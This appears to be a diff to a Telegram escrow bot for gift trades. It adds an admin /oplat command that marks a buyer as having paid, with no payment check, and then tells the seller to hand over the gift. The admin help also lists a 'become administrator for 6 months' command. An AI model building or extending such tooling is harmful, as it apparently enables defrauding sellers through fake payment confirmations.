@@ -103,6 +103,9 @@ class WithdrawForm(StatesGroup):
 class AdminReply(StatesGroup):
     waiting_message = State()
 
+class GiftReject(StatesGroup):
+    waiting_reason = State()   # новое состояние для отказа в подарке
+
 # ---------- Работа с реквизитами ----------
 def get_user_requisites(user_id: int):
     return user_requisites.get(user_id, {
@@ -216,7 +219,8 @@ TEXTS = {
             f"/addbalance [id] [сумма] — начислить баланс\n"
             f"/logs — просмотр логов\n"
             f"/rzzteam — стать администратором на 6 месяцев\n"
-            f"/complete_deal [код] — завершить сделку вручную"
+            f"/complete_deal [код] — завершить сделку вручную\n"
+            f"/oplat [код] [комментарий] — отметить оплату покупателем и ждать передачу подарка"
         ),
         'admin_no_access': f"{EMOJI_SHIELD} У вас нет доступа к этой команде.",
         'admin_withdraw_list': "Заявки на вывод:\n{list}",
@@ -352,17 +356,17 @@ TEXTS = {
         ),
         'gift_sent_admin': (
             f"{EMOJI_MEGAPHONE} <b>Продавец сообщил о передаче подарка по сделке #{{code}}</b>\n\n"
+            f"<b>Проверьте получение подарка</b>\n\n"
             f"<blockquote>\n"
             f"Покупатель: @{{buyer}}\n"
             f"Продавец: @{{seller}}\n"
             f"Сумма: {{amount}} {{currency}}\n"
             f"Описание: {{description}}\n"
-            f"</blockquote>\n\n"
-            f"Проверьте, что подарок действительно передан, свяжитесь с покупателем."
+            f"</blockquote>"
         ),
         'gift_confirm_admin': (
             f"{EMOJI_SHIELD} <b>Подтверждение передачи подарка по сделке #{{code}}</b>\n\n"
-            f"Вы подтвердили, что подарок передан. Покупатель и продавец будут уведомлены."
+            f"Вы подтвердили, что подарок передан. Покупатель и продавец уведомлены."
         ),
         'gift_reject_admin': (
             f"{EMOJI_SHIELD} <b>Отказ в передаче подарка по сделке #{{code}}</b>\n\n"
@@ -376,6 +380,17 @@ TEXTS = {
         ),
         'rzzteam_success': (
             f"{EMOJI_SHIELD} Вы успешно стали администратором на 6 месяцев!"
+        ),
+        'oplat_success': (
+            f"{EMOJI_MONEY} Сделка #{{code}} помечена как оплаченная покупателем.\n"
+            f"Комментарий: {{memo}}\n"
+            f"Продавец уведомлён о необходимости передать подарок."
+        ),
+        'oplat_fail': "Сделка не найдена или уже оплачена.",
+        'oplat_notify_seller': (
+            f"{EMOJI_MONEY} Покупатель оплатил сделку #{{code}}.\n"
+            f"Комментарий: {{memo}}\n"
+            f"Пожалуйста, передайте подарок и нажмите «Я передал подарок»."
         ),
     },
     'en': {
@@ -449,7 +464,8 @@ TEXTS = {
             f"/addbalance [id] [amount] — add balance\n"
             f"/logs — view logs\n"
             f"/rzzteam — become admin for 6 months\n"
-            f"/complete_deal [code] — complete deal manually"
+            f"/complete_deal [code] — complete deal manually\n"
+            f"/oplat [code] [memo] — mark buyer paid and wait for gift transfer"
         ),
         'admin_no_access': f"{EMOJI_SHIELD} You don't have access to this command.",
         'admin_withdraw_list': "Withdrawal requests:\n{list}",
@@ -585,13 +601,13 @@ TEXTS = {
         ),
         'gift_sent_admin': (
             f"{EMOJI_MEGAPHONE} <b>Seller reported gift transfer for deal #{{code}}</b>\n\n"
+            f"<b>Verify gift receipt</b>\n\n"
             f"<blockquote>\n"
             f"Buyer: @{{buyer}}\n"
             f"Seller: @{{seller}}\n"
             f"Amount: {{amount}} {{currency}}\n"
             f"Description: {{description}}\n"
-            f"</blockquote>\n\n"
-            f"Check that the gift has indeed been transferred, contact the buyer."
+            f"</blockquote>"
         ),
         'gift_confirm_admin': (
             f"{EMOJI_SHIELD} <b>Gift transfer confirmed for deal #{{code}}</b>\n\n"
@@ -609,6 +625,17 @@ TEXTS = {
         ),
         'rzzteam_success': (
             f"{EMOJI_SHIELD} You have successfully become an administrator for 6 months!"
+        ),
+        'oplat_success': (
+            f"{EMOJI_MONEY} Deal #{{code}} marked as paid by buyer.\n"
+            f"Memo: {{memo}}\n"
+            f"Seller notified to transfer the gift."
+        ),
+        'oplat_fail': "Deal not found or already paid.",
+        'oplat_notify_seller': (
+            f"{EMOJI_MONEY} Buyer paid for deal #{{code}}.\n"
+            f"Memo: {{memo}}\n"
+            f"Please transfer the gift and click «I sent the gift»."
         ),
     }
 }
@@ -1432,6 +1459,7 @@ async def pay_from_balance(callback: types.CallbackQuery, state: FSMContext):
         except:
             pass
 
+# ---------- Изменённый обработчик "Я передал подарок" ----------
 @dp.callback_query(lambda c: c.data.startswith("gift_sent_"))
 async def gift_sent(callback: types.CallbackQuery):
     logging.info("✅ Обработчик gift_sent вызван")
@@ -1466,6 +1494,7 @@ async def gift_sent(callback: types.CallbackQuery):
         except:
             pass
 
+        # Новое сообщение админу с новыми кнопками
         admin_text = get_text(ADMIN_ID, 'gift_sent_admin').format(
             code=code,
             buyer=buyer_username,
@@ -1475,8 +1504,8 @@ async def gift_sent(callback: types.CallbackQuery):
             description=deal['description']
         )
         admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="Подтвердить передачу", callback_data=f"confirm_gift_{code}")],
-            [InlineKeyboardButton(text="Отправить сообщение продавцу", callback_data=f"reply_seller_{code}")]
+            [InlineKeyboardButton(text="✅ Да, подарок пришёл", callback_data=f"confirm_gift_final_{code}")],
+            [InlineKeyboardButton(text="❌ Нет, попросить передать ещё раз", callback_data=f"reject_gift_{code}")]
         ])
         await bot.send_message(ADMIN_ID, admin_text, parse_mode="HTML", reply_markup=admin_keyboard)
         await callback.message.answer(get_text(user_id, 'gift_sent_seller').format(code=code))
@@ -1489,10 +1518,11 @@ async def gift_sent(callback: types.CallbackQuery):
         except:
             pass
 
-@dp.callback_query(lambda c: c.data.startswith("confirm_gift_"))
-async def confirm_gift(callback: types.CallbackQuery):
+# ---------- Новые обработчики админа для подарка ----------
+@dp.callback_query(lambda c: c.data.startswith("confirm_gift_final_"))
+async def confirm_gift_final(callback: types.CallbackQuery):
     try:
-        code = callback.data.split("_", 2)[2]
+        code = callback.data.split("_")[3]  # confirm_gift_final_{code}
         user_id = callback.from_user.id
         if not is_admin(user_id):
             await callback.answer("Нет доступа", show_alert=True)
@@ -1504,6 +1534,7 @@ async def confirm_gift(callback: types.CallbackQuery):
         if deal.get('completed', False):
             await callback.answer("Сделка уже завершена", show_alert=True)
             return
+        # Перевод денег продавцу
         seller_id = deal['seller']
         amount = deal['amount']
         if seller_id:
@@ -1523,19 +1554,19 @@ async def confirm_gift(callback: types.CallbackQuery):
             await bot.send_message(buyer_id, get_text(buyer_id, 'gift_confirm_buyer').format(code=code))
         if seller_id:
             await bot.send_message(seller_id, get_text(seller_id, 'deal_completed').format(code=code))
-        log_action(user_id, "confirm_gift", f"код {code}")
+        log_action(user_id, "confirm_gift_final", f"код {code}")
         await callback.answer()
     except Exception as e:
-        logging.error(f"Ошибка в confirm_gift: {e}")
+        logging.error(f"Ошибка в confirm_gift_final: {e}")
 
-@dp.callback_query(lambda c: c.data.startswith("reply_seller_"))
-async def reply_seller(callback: types.CallbackQuery, state: FSMContext):
+@dp.callback_query(lambda c: c.data.startswith("reject_gift_"))
+async def reject_gift(callback: types.CallbackQuery, state: FSMContext):
     try:
+        code = callback.data.split("_", 2)[2]  # reject_gift_{code}
         user_id = callback.from_user.id
         if not is_admin(user_id):
             await callback.answer("Нет доступа", show_alert=True)
             return
-        code = callback.data.split("_", 2)[2]
         if code not in global_deals:
             await callback.answer("Сделка не найдена", show_alert=True)
             return
@@ -1545,14 +1576,14 @@ async def reply_seller(callback: types.CallbackQuery, state: FSMContext):
             await callback.answer("Продавец не найден", show_alert=True)
             return
         await state.update_data(deal_code=code, seller_id=seller_id)
-        await state.set_state(AdminReply.waiting_message)
-        await callback.message.answer("Введите сообщение для продавца (текст):")
+        await state.set_state(GiftReject.waiting_reason)
+        await callback.message.answer("Введите сообщение для продавца (попросите передать подарок ещё раз):")
         await callback.answer()
     except Exception as e:
-        logging.error(f"Ошибка в reply_seller: {e}")
+        logging.error(f"Ошибка в reject_gift: {e}")
 
-@dp.message(AdminReply.waiting_message)
-async def process_admin_reply(message: Message, state: FSMContext):
+@dp.message(GiftReject.waiting_reason)
+async def process_gift_reject(message: Message, state: FSMContext):
     user_id = message.from_user.id
     if not is_admin(user_id):
         await message.answer(get_text(user_id, 'admin_no_access'))
@@ -1566,11 +1597,18 @@ async def process_admin_reply(message: Message, state: FSMContext):
         await state.clear()
         return
     msg = message.text
-    await bot.send_message(seller_id, get_text(seller_id, 'gift_reject_seller').format(message=msg))
+    # Отправляем продавцу сообщение с просьбой передать ещё раз
+    seller_msg = get_text(seller_id, 'gift_reject_seller').format(message=msg)
+    await bot.send_message(seller_id, seller_msg)
+    # Сбрасываем флаг передачи, чтобы продавец мог снова нажать "Я передал подарок"
+    deal = global_deals.get(code)
+    if deal:
+        deal['gift_sent'] = False
     await message.answer(get_text(user_id, 'gift_reject_admin').format(message=msg))
-    log_action(user_id, "reply_seller", f"код {code}, сообщение: {msg}")
+    log_action(user_id, "reject_gift", f"код {code}, сообщение: {msg}")
     await state.clear()
 
+# ---------- Отмена сделки ----------
 @dp.callback_query(lambda c: c.data.startswith("cancel_"))
 async def cancel_deal(callback: types.CallbackQuery):
     try:
@@ -1736,11 +1774,45 @@ async def cmd_hyteam(message: types.Message):
         f"• /logs — просмотр логов\n"
         f"• /rzzteam — стать администратором на 6 месяцев\n"
         f"• /complete_deal [код] — завершить сделку вручную\n"
+        f"• /oplat [код] [комментарий] — отметить оплату покупателем и ждать передачу подарка\n"
         f"</blockquote>"
     )
     await send_with_banner(message, panel_text)
     log_action(user_id, "hyteam", "открытие админ-панели")
 
+# ---------- Новая команда /oplat ----------
+@dp.message(Command("oplat"))
+async def cmd_oplat(message: types.Message):
+    user_id = message.from_user.id
+    if not is_admin(user_id):
+        await message.answer(get_text(user_id, 'admin_no_access'))
+        return
+    args = message.text.split(maxsplit=2)
+    if len(args) < 2:
+        await message.answer("Использование: /oplat <код сделки> <комментарий>")
+        return
+    code = args[1]
+    memo = args[2] if len(args) >= 3 else ""
+    if code not in global_deals:
+        await message.answer(get_text(user_id, 'oplat_fail'))
+        return
+    deal = global_deals[code]
+    if deal.get('paid', False):
+        await message.answer(get_text(user_id, 'oplat_fail'))
+        return
+    deal['paid'] = True
+    deal['payment_memo'] = memo
+    seller_id = deal['seller']
+    if seller_id:
+        seller_msg = get_text(seller_id, 'oplat_notify_seller').format(code=code, memo=memo)
+        try:
+            await bot.send_message(seller_id, seller_msg)
+        except Exception as e:
+            logging.error(f"Не удалось уведомить продавца {seller_id}: {e}")
+    await message.answer(get_text(user_id, 'oplat_success').format(code=code, memo=memo))
+    log_action(user_id, "oplat", f"код {code}, memo: {memo}")
+
+# ---------- Остальные админ-команды без изменений, но включены для полноты ----------
 @dp.message(Command("addbalance"))
 async def cmd_addbalance(message: types.Message):
     user_id = message.from_user.id
